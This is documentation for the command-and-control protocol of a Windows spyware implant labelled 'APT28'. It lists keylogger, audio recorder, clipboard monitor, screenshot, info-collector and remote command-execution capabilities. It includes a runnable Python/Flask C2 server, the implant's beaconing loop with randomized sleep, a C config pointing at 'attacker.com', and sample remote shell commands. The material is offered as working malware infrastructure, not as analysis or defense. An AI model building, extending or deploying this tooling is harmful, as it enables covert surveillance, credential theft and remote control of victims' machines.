# C2 HTTP API Documentation

## Overview
The C2 handler communicates with an HTTP server over standard HTTP protocol using Windows API only. The malware periodically contacts the server at random intervals between 60-120 seconds to:
1. Register itself
2. Fetch capability commands
3. Execute capabilities and report results

## Capability Commands

Capabilities are invoked by numeric command IDs:
- `1` - Audio Recorder (start_audio_recorder)
- `2` - Clipboard Monitor (start_clipboard_monitor)
- `3` - Keylogger (start_keylogger)
- `4` - Screenshot (start_screenshot)
- `5` - Info Collector (start_info_collector)
- `6` - Command Executor (execute_command_with_evasion)
- `0` - No Command (idle)

## API Endpoints

### 1. Registration Endpoint
**URL:** `GET /api/register?id=<client_id>`

**Purpose:** Register a new client with the C2 server

**Response:** JSON or text confirmation
```
Example:
GET /api/register?id=APT28_1234_1701619200
```

### 2. Capability Command Fetch Endpoint
**URL:** `GET /api/command?id=<client_id>`

**Purpose:** Retrieve capability command ID and arguments to execute

**Response:** JSON object with capability and args
```json
{
  "capability": 6,
  "args": "cmd.exe /c whoami"
}
```

Example:
```
GET /api/command?id=APT28_1234_1701619200

Response:
{
  "capability": 6,
  "args": "cmd.exe /c ipconfig /all"
}
```

### 3. Report Endpoint
**URL:** `POST /api/report`

**Headers:** `Content-Type: application/json`

**Body:** JSON payload with client ID, capability executed, and result
```json
{
  "id": "APT28_1234_1701619200",
  "capability": 1,
  "result": "executed"
}
```

## Client Behavior

1. **Initialization:** Client generates unique ID: `APT28_<PID>_<TIMESTAMP>`
2. **Registration:** Makes GET request to register endpoint
3. **Capability Loop:** Repeats every 60-120 seconds (random):
   - Sleep for random interval (60-120 seconds)
   - Fetch capability command ID from server
   - Execute the corresponding capability function
   - Report execution result back to server

## Server Implementation Example (Python/Flask)

```python
from flask import Flask, request, jsonify
import uuid
import time

app = Flask(__name__)
commands = {}  # Store pending commands per client
results = []   # Store execution results

@app.route('/api/register', methods=['GET'])
def register():
    client_id = request.args.get('id')
    print(f"[+] Client registered: {client_id}")
    commands[client_id] = 0  # No command by default
    return jsonify({"status": "registered", "id": client_id})

@app.route('/api/command', methods=['GET'])
def get_command():
    client_id = request.args.get('id')
    cmd = commands.get(client_id, 0)
    print(f"[*] Capability command sent to {client_id}: {cmd}")
    return str(cmd)

@app.route('/api/report', methods=['POST'])
def report():
    data = request.get_json()
    client_id = data.get('id')
    capability = data.get('capability')
    result = data.get('result')
    print(f"[+] Result from {client_id} - Capability {capability}: {result}")
    results.append({
        "client": client_id,
        "capability": capability,
        "result": result,
        "time": time.time()
    })
    return jsonify({"status": "received"})

# To send capability command to client
def send_capability_to_client(client_id, capability_id):
    commands[client_id] = capability_id
    print(f"[*] Assigned capability {capability_id} to {client_id}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
```

## Configuration

To change the C2 server URL and port, modify in `c2_handler.c`:
```c
#define C2_SERVER "attacker.com"
#define C2_PORT 80
```

## Sending Commands with Arguments

The C2 server now supports passing arguments to capabilities:

**POST to `/api/send_command`:**
```json
{
  "client_id": "APT28_1234_1701619200",
  "capability_id": 6,
  "args": "cmd.exe /c whoami && ipconfig"
}
```

**Argument Usage by Capability:**
- **Capability 6 (Command Executor)**: Full command string (e.g., `"cmd.exe /c dir C:\\"`)
- **Other Capabilities**: Reserved for future use (currently optional)

**Client Fetches Command:**
```json
GET /api/command?id=APT28_1234_1701619200

Response:
{
  "capability": 6,
  "args": "cmd.exe /c whoami && ipconfig"
}
```

The client parses the JSON response and executes the capability with the provided arguments.

## Implementation Notes

- Uses Windows API exclusively (WinINet for HTTP communication)
- Client ID includes process ID and timestamp for uniqueness
- Communication is over HTTP (consider HTTPS for production environments)
- JSON responses for command fetch (with capability and args)
- Simple JSON parser implemented in C for client-side parsing
- No authentication implemented
- Capabilities are started as threads by the C2 handler

